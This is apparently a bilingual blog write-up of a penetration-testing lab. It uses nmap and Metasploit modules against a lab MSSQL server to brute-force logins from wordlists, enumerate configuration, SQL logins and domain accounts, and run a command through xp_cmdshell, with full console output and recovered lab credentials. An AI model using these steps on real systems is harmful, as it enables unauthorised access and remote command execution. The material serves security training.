---
layout: post
title: "MSSQL Metasploit"
date: "2022-08-28"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Assessment Methodologies
    - Enumeration
---

# MSSQL Metasploit
```
Target IP Address: 10.4.30.157
```

```
nmap 10.4.30.157

PORT        STATE   SERVICE
53/tcp      open    domain
88/tcp      open    kerberos-sec
135/tcp     open    msrpc
139/tcp     open    netbios-ssn
389/tcp     open    ldap
445/tcp     open    microsoft-ds
464/tcp     open    kpasswd5
593/tcp     open    http-rpc-epmap
636/tcp     open    ldapssl
1433/tcp    open    ms-sql-s
3268/tcp    open    globalcatLDAP
3269/tcp    open    globalcatLDAPssl
3389/tcp    open    ms-wbt-server
```

```
nmap 10.4.30.157 -p 1433 -sV --script ms-sql-info
```

[MSSQL Login Utility](https://www.rapid7.com/db/modules/auxiliary/scanner/mssql/mssql_login/)

MSSQL 登录实用程序

这个模块简单地查询特定用户/密码的 MSSQL 实例（默认是 sa 和空白）。

```
msfconsole 

use auxiliary/scanner/mssql/mssql_login
setg rhosts 10.4.30.157
set user_file /root/Desktop/wordlist/common_users.txt
set pass_file /root/Desktop/wordlist/100-common-passwords.txt
set verbose false
options
run
```

[Microsoft SQL Server Configuration Enumerator](https://www.rapid7.com/db/modules/auxiliary/admin/mssql/mssql_enum/)

Microsoft SQL Server 配置枚举器

该模块将对 Microsoft SQL Server 数据库执行一系列配置审核和安全检查。要使该模块正常工作，必须提供有效的管理用户凭据。

```
use auxiliary/admin/mssql/mssql_enum
run
```

[Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration](https://www.rapid7.com/db/modules/auxiliary/admin/mssql/mssql_enum_sql_logins/)

Microsoft SQL Server SUSER_SNAME SQL 登录枚举

此模块可用于从具有任何登录名的 SQL Server 获取所有登录名的列表。从 master..syslogins 表中选择所有登录名仅限于系统管理员。但是，具有 PUBLIC 角色（每个人）的登录可以使用 SUSER_SNAME 函数通过模糊 principal_id 参数快速枚举所有 SQL Server 登录。这很简单，因为分配给登录的主体 ID 是递增的。枚举登录后，可以通过 sp_defaultdb 错误分析对其进行验证。这很重要，因为并非所有主体 ID 都解析为 SQL 登录名（有些会解析为角色）。一旦枚举了登录名，它们就可以用于字典攻击。

```
use auxiliary/admin/mssql/mssql_enum_sql_logins
exploit
```

[Microsoft SQL Server Command Execution](https://www.rapid7.com/db/modules/auxiliary/admin/mssql/mssql_exec/)

Microsoft SQL Server 命令执行

该模块将通过 xp_cmdshell（默认）或 sp_oacreate 过程（更安全、无输出、无临时数据表）在 MSSQL/MSDE 实例上执行 Windows 命令。使用此模块需要有效的用户名和密码。

```
use auxiliary/admin/mssql/mssql_exec
set cmd whoami
options
run
```

[Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration](https://www.rapid7.com/db/modules/auxiliary/admin/mssql/mssql_enum_domain_accounts/)

Microsoft SQL Server SUSER_SNAME Windows 域帐户枚举

此模块可用于使用 SUSER_SNAME 函数暴力破解与 SQL Server 域关联的 RID。这类似于 smb_lookupsid 模块，但通过 SQL Server 查询作为具有 PUBLIC 角色的任何用户（每个人）执行。可以枚举的信息包括 Windows 域用户、组和计算机帐户。枚举帐户随后可用于在线字典攻击。

```
use auxiliary/admin/mssql/mssql_enum_domain_accounts
exploit
```

# Recon: MSSQL: Metasploit（侦察：MSSQL：Metasploit）
## 概述
为您提供了一台 Kali GUI 机器和一台运行 MSSQL 服务的目标机器。目标机器的 IP 地址在 Kali 机器桌面 (/root/Desktop/target) 上名为 target 的文本文件中提供。 

你的任务是使用 Kali 机器上可用的工具对服务进行指纹识别，并运行 Metasploit 框架来枚举目标机器服务。

目标：

1. 发现有效用户及其密码
2. 枚举 MSSQL 配置
3. 枚举所有 MSSQL 登录
4. 在目标机器上执行命令
5. 枚举所有可用的系统用户

指示：

你的 Kali 机器有一个 IP 地址为 10.10.XY 的接口运行“ip addr”以了解 X 和 Y 的值。
目标机器的 IP 地址在文件“/root/Desktop/target”中提到
不要攻击位于 IP 地址 192.VW1 和 10.10.X.1 的网关

## 我自己的思路
A Kali GUI machine and a target machine running an MSSQL service are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the service using the tools available on the Kali machine and run the Metasploit framework to enumerate the target machine service.

```
Target IP Address : 10.0.18.92
```

```
root@attackdefense:~# nmap 10.0.18.92
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-27 17:52 IST
Nmap scan report for 10.0.18.92
Host is up (0.0035s latency).
Not shown: 987 closed ports
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1.68 seconds

```

```
root@attackdefense:~# nmap -p 1433 -sV 10.0.18.92
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-27 17:56 IST
Nmap scan report for 10.0.18.92
Host is up (0.0037s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.55 seconds

```

```
root@attackdefense:~# nmap -p 1433 --script ms-sql-info --script-args mssql.instance-port=1433 10.0.18.92
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-27 18:07 IST
Nmap scan report for 10.0.18.92
Host is up (0.0032s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s

Host script results:
| ms-sql-info: 
|   10.0.18.92:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds

```

Objective:

Discover valid users and their passwords

```
sa:
dbadmin:anamaria
auditor:nikita
```

[MSSQL Login Utility](https://www.rapid7.com/db/modules/auxiliary/scanner/mssql/mssql_login/)

MSSQL 登录实用程序

这个模块简单地查询特定用户/密码的 MSSQL 实例（默认是 sa 和空白）。

```
root@attackdefense:~# msfconsole -q
msf6 > use auxiliary/scanner/mssql/mssql_login
msf6 auxiliary(scanner/mssql/mssql_login) > show options

Module options (auxiliary/scanner/mssql/mssql_login):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   BLANK_PASSWORDS      true             no        Try blank passwords for all users
   BRUTEFORCE_SPEED     5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS         false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS          false            no        Add all passwords in the current database to the list
   DB_ALL_USERS         false            no        Add all users in the current database to the list
   PASSWORD                              no        A specific password to authenticate with
   PASS_FILE                             no        File containing passwords, one per line
   RHOSTS                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                1433             yes       The target port (TCP)
   STOP_ON_SUCCESS      false            yes       Stop guessing when a credential works for a host
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   THREADS              1                yes       The number of concurrent threads (max one per host)
   USERNAME             sa               no        A specific username to authenticate as
   USERPASS_FILE                         no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS         false            no        Try the username as the password for all users
   USER_FILE                             no        File containing usernames, one per line
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
   VERBOSE              true             yes       Whether to print output for all attempts

msf6 auxiliary(scanner/mssql/mssql_login) > setg RHOSTS 10.0.18.92
RHOSTS => 10.0.18.92
msf6 auxiliary(scanner/mssql/mssql_login) > set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt
PASS_FILE => /root/Desktop/wordlist/100-common-passwords.txt
msf6 auxiliary(scanner/mssql/mssql_login) > set USER_FILE /root/Desktop/wordlist/common_users.txt
USER_FILE => /root/Desktop/wordlist/common_users.txt
msf6 auxiliary(scanner/mssql/mssql_login) > set VERBOSE false
VERBOSE => false
msf6 auxiliary(scanner/mssql/mssql_login) > run

[*] 10.0.18.92:1433       - 10.0.18.92:1433 - MSSQL - Starting authentication scanner.
[+] 10.0.18.92:1433       - 10.0.18.92:1433 - Login Successful: WORKSTATION\sa:
[+] 10.0.18.92:1433       - 10.0.18.92:1433 - Login Successful: WORKSTATION\dbadmin:anamaria
[+] 10.0.18.92:1433       - 10.0.18.92:1433 - Login Successful: WORKSTATION\auditor:nikita
[*] 10.0.18.92:1433       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

Enumerate MSSQL configuration

[Microsoft SQL Server Configuration Enumerator](https://www.rapid7.com/db/modules/auxiliary/admin/mssql/mssql_enum/)

Microsoft SQL Server 配置枚举器

该模块将对 Microsoft SQL Server 数据库执行一系列配置审核和安全检查。要使该模块正常工作，必须提供有效的管理用户凭据。

```
msf6 auxiliary(scanner/mssql/mssql_login) > use auxiliary/admin/mssql/mssql_enum
msf6 auxiliary(admin/mssql/mssql_enum) > show options

Module options (auxiliary/admin/mssql/mssql_enum):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD                              no        The password for the specified username
   RHOSTS               10.0.18.92       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                1433             yes       The target port (TCP)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)

msf6 auxiliary(admin/mssql/mssql_enum) > set USERNAME dbadmin
USERNAME => dbadmin
msf6 auxiliary(admin/mssql/mssql_enum) > set PASSWORD anamaria
PASSWORD => anamaria
msf6 auxiliary(admin/mssql/mssql_enum) > run
[*] Running module against 10.0.18.92

[*] 10.0.18.92:1433 - Running MS SQL Server Enumeration...
[*] 10.0.18.92:1433 - Version:
[*]	Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
[*]		Sep 24 2019 13:48:23 
[*]		Copyright (C) 2019 Microsoft Corporation
[*]		Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 <X64> (Build 14393: ) (Hypervisor)
[*] 10.0.18.92:1433 - Configuration Parameters:
[*] 10.0.18.92:1433 - 	C2 Audit Mode is Not Enabled
[*] 10.0.18.92:1433 - 	xp_cmdshell is Enabled
[*] 10.0.18.92:1433 - 	remote access is Enabled
[*] 10.0.18.92:1433 - 	allow updates is Not Enabled
[*] 10.0.18.92:1433 - 	Database Mail XPs is Not Enabled
[*] 10.0.18.92:1433 - 	Ole Automation Procedures are Not Enabled
[*] 10.0.18.92:1433 - Databases on the server:
[*] 10.0.18.92:1433 - 	Database name:master
[*] 10.0.18.92:1433 - 	Database Files for master:
[*] 10.0.18.92:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\master.mdf
[*] 10.0.18.92:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\mastlog.ldf
[*] 10.0.18.92:1433 - 	Database name:tempdb
[*] 10.0.18.92:1433 - 	Database Files for tempdb:
[*] 10.0.18.92:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\tempdb.mdf
[*] 10.0.18.92:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\templog.ldf
[*] 10.0.18.92:1433 - 	Database name:model
[*] 10.0.18.92:1433 - 	Database Files for model:
[*] 10.0.18.92:1433 - 	Database name:msdb
[*] 10.0.18.92:1433 - 	Database Files for msdb:
[*] 10.0.18.92:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\MSDBData.mdf
[*] 10.0.18.92:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\MSDBLog.ldf
[*] 10.0.18.92:1433 - System Logins on this Server:
[*] 10.0.18.92:1433 - 	sa
[*] 10.0.18.92:1433 - 	dbadmin
[*] 10.0.18.92:1433 - Disabled Accounts:
[*] 10.0.18.92:1433 - 	No Disabled Logins Found
[*] 10.0.18.92:1433 - No Accounts Policy is set for:
[*] 10.0.18.92:1433 - 	sa
[*] 10.0.18.92:1433 - 	dbadmin
[*] 10.0.18.92:1433 - Password Expiration is not checked for:
[*] 10.0.18.92:1433 - 	sa
[*] 10.0.18.92:1433 - 	dbadmin
[*] 10.0.18.92:1433 - System Admin Logins on this Server:
[*] 10.0.18.92:1433 - 	sa
[*] 10.0.18.92:1433 - Windows Logins on this Server:
[*] 10.0.18.92:1433 - 	No Windows logins found!
[*] 10.0.18.92:1433 - Windows Groups that can logins on this Server:
[*] 10.0.18.92:1433 - 	No Windows Groups where found with permission to login to system.
[*] 10.0.18.92:1433 - Accounts with Username and Password being the same:
[*] 10.0.18.92:1433 - 	No Account with its password being the same as its username was found.
[*] 10.0.18.92:1433 - Accounts with empty password:
[*] 10.0.18.92:1433 - 	No Accounts with empty passwords where found.
[*] 10.0.18.92:1433 - Stored Procedures with Public Execute Permission found:
[*] 10.0.18.92:1433 - 	sp_replsetsyncstatus
[*] 10.0.18.92:1433 - 	sp_replcounters
[*] 10.0.18.92:1433 - 	sp_replsendtoqueue
[*] 10.0.18.92:1433 - 	sp_resyncexecutesql
[*] 10.0.18.92:1433 - 	sp_prepexecrpc
[*] 10.0.18.92:1433 - 	sp_repltrans
[*] 10.0.18.92:1433 - 	sp_xml_preparedocument
[*] 10.0.18.92:1433 - 	xp_qv
[*] 10.0.18.92:1433 - 	xp_getnetname
[*] 10.0.18.92:1433 - 	sp_releaseschemalock
[*] 10.0.18.92:1433 - 	sp_refreshview
[*] 10.0.18.92:1433 - 	sp_replcmds
[*] 10.0.18.92:1433 - 	sp_unprepare
[*] 10.0.18.92:1433 - 	sp_resyncprepare
[*] 10.0.18.92:1433 - 	sp_createorphan
[*] 10.0.18.92:1433 - 	xp_dirtree
[*] 10.0.18.92:1433 - 	sp_replwritetovarbin
[*] 10.0.18.92:1433 - 	sp_replsetoriginator
[*] 10.0.18.92:1433 - 	sp_xml_removedocument
[*] 10.0.18.92:1433 - 	sp_repldone
[*] 10.0.18.92:1433 - 	sp_reset_connection
[*] 10.0.18.92:1433 - 	xp_fileexist
[*] 10.0.18.92:1433 - 	xp_fixeddrives
[*] 10.0.18.92:1433 - 	sp_getschemalock
[*] 10.0.18.92:1433 - 	sp_prepexec
[*] 10.0.18.92:1433 - 	xp_revokelogin
[*] 10.0.18.92:1433 - 	sp_execute_external_script
[*] 10.0.18.92:1433 - 	sp_resyncuniquetable
[*] 10.0.18.92:1433 - 	sp_replflush
[*] 10.0.18.92:1433 - 	sp_resyncexecute
[*] 10.0.18.92:1433 - 	xp_grantlogin
[*] 10.0.18.92:1433 - 	sp_droporphans
[*] 10.0.18.92:1433 - 	xp_regread
[*] 10.0.18.92:1433 - 	sp_getbindtoken
[*] 10.0.18.92:1433 - 	sp_replincrementlsn
[*] 10.0.18.92:1433 - Instances found on this server:
[*] 10.0.18.92:1433 - Default Server Instance SQL Server Service is running under the privilege of:
[*] 10.0.18.92:1433 - 	xp_regread might be disabled in this system
[*] Auxiliary module execution completed

```

Enumerate all MSSQL logins

[Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration](https://www.rapid7.com/db/modules/auxiliary/admin/mssql/mssql_enum_sql_logins/)

Microsoft SQL Server SUSER_SNAME SQL 登录枚举

此模块可用于从具有任何登录名的 SQL Server 获取所有登录名的列表。从 master..syslogins 表中选择所有登录名仅限于系统管理员。但是，具有 PUBLIC 角色（每个人）的登录可以使用 SUSER_SNAME 函数通过模糊 principal_id 参数快速枚举所有 SQL Server 登录。这很简单，因为分配给登录的主体 ID 是递增的。枚举登录后，可以通过 sp_defaultdb 错误分析对其进行验证。这很重要，因为并非所有主体 ID 都解析为 SQL 登录名（有些会解析为角色）。一旦枚举了登录名，它们就可以用于字典攻击。

```
msf6 auxiliary(admin/mssql/mssql_enum) > use auxiliary/admin/mssql/mssql_enum_sql_logins
msf6 auxiliary(admin/mssql/mssql_enum_sql_logins) > show options

Module options (auxiliary/admin/mssql/mssql_enum_sql_logins):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   FuzzNum              300              yes       Number of principal_ids to fuzz.
   PASSWORD                              no        The password for the specified username
   RHOSTS               10.0.18.92       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                1433             yes       The target port (TCP)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)

msf6 auxiliary(admin/mssql/mssql_enum_sql_logins) > run
[*] Running module against 10.0.18.92

[*] 10.0.18.92:1433 - Attempting to connect to the database server at 10.0.18.92:1433 as sa...
[+] 10.0.18.92:1433 - Connected.
[*] 10.0.18.92:1433 - Checking if sa has the sysadmin role...
[+] 10.0.18.92:1433 - sa is a sysadmin.
[*] 10.0.18.92:1433 - Setup to fuzz 300 SQL Server logins.
[*] 10.0.18.92:1433 - Enumerating logins...
[+] 10.0.18.92:1433 - 38 initial SQL Server logins were found.
[*] 10.0.18.92:1433 - Verifying the SQL Server logins...
[+] 10.0.18.92:1433 - 16 SQL Server logins were verified:
[*] 10.0.18.92:1433 -  - ##MS_PolicyEventProcessingLogin##
[*] 10.0.18.92:1433 -  - ##MS_PolicyTsqlExecutionLogin##
[*] 10.0.18.92:1433 -  - ##MS_SQLAuthenticatorCertificate##
[*] 10.0.18.92:1433 -  - ##MS_SQLReplicationSigningCertificate##
[*] 10.0.18.92:1433 -  - ##MS_SQLResourceSigningCertificate##
[*] 10.0.18.92:1433 -  - BUILTIN\Users
[*] 10.0.18.92:1433 -  - EC2AMAZ-5861GL6\Administrator
[*] 10.0.18.92:1433 -  - NT AUTHORITY\SYSTEM
[*] 10.0.18.92:1433 -  - NT SERVICE\SQLTELEMETRY$SQLEXPRESS
[*] 10.0.18.92:1433 -  - NT SERVICE\SQLWriter
[*] 10.0.18.92:1433 -  - NT SERVICE\Winmgmt
[*] 10.0.18.92:1433 -  - NT Service\MSSQL$SQLEXPRESS
[*] 10.0.18.92:1433 -  - admin
[*] 10.0.18.92:1433 -  - auditor
[*] 10.0.18.92:1433 -  - dbadmin
[*] 10.0.18.92:1433 -  - sa
[*] Auxiliary module execution completed
msf6 auxiliary(admin/mssql/mssql_enum_sql_logins) > 
```

Execute a command on the target machine

[Microsoft SQL Server Command Execution](https://www.rapid7.com/db/modules/auxiliary/admin/mssql/mssql_exec/)

Microsoft SQL Server 命令执行

该模块将通过 xp_cmdshell（默认）或 sp_oacreate 过程（更安全、无输出、无临时数据表）在 MSSQL/MSDE 实例上执行 Windows 命令。使用此模块需要有效的用户名和密码。

```
Target IP Address : 10.0.19.29
```

```
root@attackdefense:~# msfconsole -q
msf6 > use auxiliary/admin/mssql/mssql_exec
msf6 auxiliary(admin/mssql/mssql_exec) > show options

Module options (auxiliary/admin/mssql/mssql_exec):

   Name                 Current Setting                       Required  Description
   ----                 ---------------                       --------  -----------
   CMD                  cmd.exe /c echo OWNED > C:\owned.exe  no        Command to execute
   PASSWORD                                                   no        The password for the specified username
   RHOSTS                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                1433                                  yes       The target port (TCP)
   TDSENCRYPTION        false                                 yes       Use TLS/SSL for TDS data "Force Encryption"
   TECHNIQUE            xp_cmdshell                           yes       Technique to use for command execution (Accepted: xp_cmdshell, sp_oacreate)
   USERNAME             sa                                    no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false                                 yes       Use windows authentification (requires DOMAIN option set)

msf6 auxiliary(admin/mssql/mssql_exec) > set RHOSTS 10.0.19.29
RHOSTS => 10.0.19.29
msf6 auxiliary(admin/mssql/mssql_exec) > set CMD whoami
CMD => whoami
msf6 auxiliary(admin/mssql/mssql_exec) > run
[*] Running module against 10.0.19.29

[*] 10.0.19.29:1433 - SQL Query: EXEC master..xp_cmdshell 'whoami'



 output
 ------
 nt service\mssql$sqlexpress

[*] Auxiliary module execution completed

```

Enumerate all available system users

[Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration](https://www.rapid7.com/db/modules/auxiliary/admin/mssql/mssql_enum_domain_accounts/)

Microsoft SQL Server SUSER_SNAME Windows 域帐户枚举

此模块可用于使用 SUSER_SNAME 函数暴力破解与 SQL Server 域关联的 RID。这类似于 smb_lookupsid 模块，但通过 SQL Server 查询作为具有 PUBLIC 角色的任何用户（每个人）执行。可以枚举的信息包括 Windows 域用户、组和计算机帐户。枚举帐户随后可用于在线字典攻击。

```
msf6 auxiliary(admin/mssql/mssql_exec) > use auxiliary/admin/mssql/mssql_enum_domain_accounts
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > show options

Module options (auxiliary/admin/mssql/mssql_enum_domain_accounts):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   FuzzNum              10000            yes       Number of principal_ids to fuzz.
   PASSWORD                              no        The password for the specified username
   RHOSTS                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                1433             yes       The target port (TCP)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)

msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set RHOSTS 10.0.19.29
RHOSTS => 10.0.19.29
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > run
[*] Running module against 10.0.19.29

[*] 10.0.19.29:1433 - Attempting to connect to the database server at 10.0.19.29:1433 as sa...
[+] 10.0.19.29:1433 - Connected.
[*] 10.0.19.29:1433 - SQL Server Name: EC2AMAZ-5861GL6
[*] 10.0.19.29:1433 - Domain Name: CONTOSO
[+] 10.0.19.29:1433 - Found the domain sid: 010500000000000515000000cf4b5eb619bca0ed968e21ef
[*] 10.0.19.29:1433 - Brute forcing 10000 RIDs through the SQL Server, be patient...
[*] 10.0.19.29:1433 -  - EC2AMAZ-5861GL6\Administrator
[*] 10.0.19.29:1433 -  - CONTOSO\Guest
[*] 10.0.19.29:1433 -  - CONTOSO\krbtgt
[*] 10.0.19.29:1433 -  - CONTOSO\DefaultAccount
[*] 10.0.19.29:1433 -  - CONTOSO\Domain Admins
[*] 10.0.19.29:1433 -  - CONTOSO\Domain Users
[*] 10.0.19.29:1433 -  - CONTOSO\Domain Guests
[*] 10.0.19.29:1433 -  - CONTOSO\Domain Computers
[*] 10.0.19.29:1433 -  - CONTOSO\Domain Controllers
[*] 10.0.19.29:1433 -  - CONTOSO\Cert Publishers
[*] 10.0.19.29:1433 -  - CONTOSO\Schema Admins
[*] 10.0.19.29:1433 -  - CONTOSO\Enterprise Admins
[*] 10.0.19.29:1433 -  - CONTOSO\Group Policy Creator Owners
[*] 10.0.19.29:1433 -  - CONTOSO\Read-only Domain Controllers
[*] 10.0.19.29:1433 -  - CONTOSO\Cloneable Domain Controllers
[*] 10.0.19.29:1433 -  - CONTOSO\Protected Users
[*] 10.0.19.29:1433 -  - CONTOSO\Key Admins
[*] 10.0.19.29:1433 -  - CONTOSO\Enterprise Key Admins
[*] 10.0.19.29:1433 -  - CONTOSO\RAS and IAS Servers
[*] 10.0.19.29:1433 -  - CONTOSO\Allowed RODC Password Replication Group
[*] 10.0.19.29:1433 -  - CONTOSO\Denied RODC Password Replication Group
[*] 10.0.19.29:1433 -  - CONTOSO\SQLServer2005SQLBrowserUser$EC2AMAZ-5861GL6
[*] 10.0.19.29:1433 -  - CONTOSO\MSSQL-SERVER$
[*] 10.0.19.29:1433 -  - CONTOSO\DnsAdmins
[*] 10.0.19.29:1433 -  - CONTOSO\DnsUpdateProxy
[*] 10.0.19.29:1433 -  - CONTOSO\alice
[*] 10.0.19.29:1433 -  - CONTOSO\bob
[*] 10.0.19.29:1433 -  - CONTOSO\sysadmin
[+] 10.0.19.29:1433 - 29 user accounts, groups, and computer accounts were found.
[*] 10.0.19.29:1433 - Query results have been saved to: /root/.msf4/loot/20220828083137_default_10.0.19.29_mssql.domain.acc_547452.txt
[*] Auxiliary module execution completed

```

## 解决方案
此实验室的解决方案可在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-2314.pdf